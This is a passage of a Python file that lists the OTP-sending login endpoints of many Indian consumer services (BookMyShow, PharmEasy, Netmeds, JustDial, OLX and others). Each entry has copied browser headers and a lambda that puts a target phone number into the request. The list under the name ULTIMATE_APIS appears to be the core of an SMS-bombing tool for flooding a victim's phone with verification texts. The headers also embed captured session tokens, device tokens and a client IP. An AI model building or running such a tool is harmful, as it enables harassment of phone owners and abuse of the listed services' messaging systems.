        "data": lambda phone: f'{{"mobile_psid":"{phone}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
    },
    
    {
        "name": "BookMyShow",
        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'x-app-code': "WEBV2",
            'sec-ch-ua-platform': "\"Android\"",
            'x-geohash': "te7",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'x-region-slug': "mumbai",
            'x-latitude': "19.12175",
            'x-subregion-code': "MWEST",
            'cf-ipcountry': "IN",
            'x-platform-code': "WEBV2",
            'x-longitude': "72.8504",
            'x-platform': "WEBV2",
            'x-segments': "",
            'true-client-ip': "47.11.248.163",
            'x-bms-id': "1.147986007.1769573488873",
            'x-location-selection': "manual",
            'x-region-code': "MUMBAI",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.7",
            'origin': "https://in.bookmyshow.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://in.bookmyshow.com/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{phone}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
    },
    
    {
        "name": "Bewakoof",
        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'api-token': "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'x-client-device-token': "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            'ab-id': "30",
            'CLIENT-DEVICE-TOKEN': "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            'sec-ch-ua-mobile': "?1",
            'x-ab-id': "30",
            'x-tmrw-request-trace-id': "6f104122-57c2-4bed-a0e5-d6656fdd9bed",
            'x-origin-host': "api-prod.bewakoof.com/v3/user/auth/login/otp",
            'Access-Control-Allow-Origin': "*",
            'Preferred-Location': "IN",
            'x-tmrw-trace-id': "8091dffb-79a5-478b-ad37-559dc1da7157",
            'Sec-GPC': "1",
            'Accept-Language': "en-US,en;q=0.6",
            'Origin': "https://www.bewakoof.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://www.bewakoof.com/"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","country_code":"+91"}}'
    },
    
    {
        "name": "PharmEasy",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.7",
            'origin': "https://pharmeasy.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://pharmeasy.in/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"param":"{phone}"}}'
    },
    
    {
        "name": "Netmeds",
        "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "Bearer NjVmNTYyYzE1MDRhNTlhNjdmNTI5YWQ0Ol9VLW9oSTRJeQ==",
            'x-location-detail': "{\"country_iso_code\":\"IN\",\"country\":\"INDIA\",\"pincode\":\"110001\",\"city\":\"Delhi\",\"state\":\"Delhi\"}",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'x-fp-signature': "v1.1:1d12dc4220ec1c0873615cc186d1270ab2392f3523c8fbfdd02e11d0633212c5",
            'x-fp-date': "20260128T041032Z",
            'x-fp-sdk-version': "1.9.4-13",
            'x-currency-code': "INR",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.netmeds.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.netmeds.com/auth/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","country_code":"91"}}'
    },
    
    {
        "name": "MaxFashion",
        "url": "https://www.maxfashion.in/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'content-type': "application/json;",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.6",
            'origin': "https://www.maxfashion.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.maxfashion.in/in/en/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"signInMobile":"+91{phone}"}}'
    },
    
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'content-type': "application/json;",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.lifestylestores.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.lifestylestores.com/in/en/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"signInMobile":"+91{phone}"}}'
    },
    
    {
        "name": "Spar India",
        "url": "https://www.sparindia.com/api/get-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'token': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3Njk1Mjc2MTcsImV4cCI6MTc2OTUyNzkxN30.m1KkAzXZANYyYRXfaBV8ogoo0VBpP-6lASO5ygw0TFI",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.sparindia.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.sparindia.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","finalStore":"view_20011"}}'
    },
    
    {
        "name": "Dailyhunt",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://dailyhunt.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"method":"POST","body":{{"mobileNo":"91-{phone}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    
    {
        "name": "JustDial",
        "url": "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&t_and_c=1&source=2&version=6.4&enc=1&env=p",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'tkn': "7bf7b4ab18ffd5fa8e6886cbd74767444e4df8ab67e673227f2ca2fb10da36de.eyJlbmMiOiIwMjA3MDIwNTEyMDEwNDA3MDMwNjEwMTEwNjAxMDMwNTA0MDgxMzE1MDkxNjAyMDYiLCJ0bXIiOiIwMjAyNjAwMDAxMDAwMjgwMDAwOTAwMDM2MDAwNDIwMDAwOSIsInJvd2R0Ijp7ImJzcmFnbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDQuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJlbnRpdHlpZG1kNSI6IjcwNWRkYmMzODA0ZGM0NjIwYmMzMzU4MzgxY2YyMjBhIiwic3NuIjoiWVkiLCJsY2wiOiJZWSIsImhzdCI6IjAwNTAiLCJhdGh2IjoiMDAwMSIsImJpZCI6IjUwMTA1MzczNjE0NDAwMDUzNzM2IiwidWlkIjoiNTAxMDUzNzM2MTQ0MDAwNTM3MzYwMDA4MjAwMDAzNjAwMDAwMjQiLCJuaCI6IjAwMDgyMCIsIm53IjoiMDAwMzYwIiwibnBkIjoiMDAwMDI0IiwiYWN0IjoibGduIiwicHRvIjoiQUJDREVGIiwic3JjIjoyLCJic3JvcmduIjoiaHR0cHM6Ly93d3cuanVzdGRpYWwuY29tIiwidGVjaHRybSI6IiIsImRtbiI6Imh0dHBzd3d3anVzdGRpYWxjb20iLCJzdG4iOiIwMDAwNjQ0NERFMDAyMDI2NEM5QzA5REJDNjAwMDAwMUNEMDZGMTJBNDMwMDAwMjg0RDk3QTA0QUU0MDAwMDA5MTRFRjM3Rjk3ODAwMDAzNkEwRUQzQ0NCQUYwMDAwNDJENTE2QUU4NjlGMDAwMDAwMDAwMDAwNjE3Njk1NzUzMjAyMVE0UTVYNEU2VDhHOVg4VTlaMkE5VDFNMlcyQTJRNSIsImFjdG1uIjoiIiwibmRhdXRoIjowLCJ0YyI6NH19.734d36ea8072e3d0cabb9b785a2d366daacfd9a8d1f0a90d31f82441f026bf63",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.justdial.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.justdial.com/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","fname":""}}'
    },
    
    {
        "name": "OLX",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-panamera-client-id': "web-mobile",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'x-panamera-fingerprint': "bf96bb5e1a2f98d5c4d90180ad14b481#1769439579909",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.olx.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.olx.in/en-in",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"grantType":"phone","phone":"+91{phone}","language":"en-IN"}}'
    }
]

# Total APIs loaded
print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")
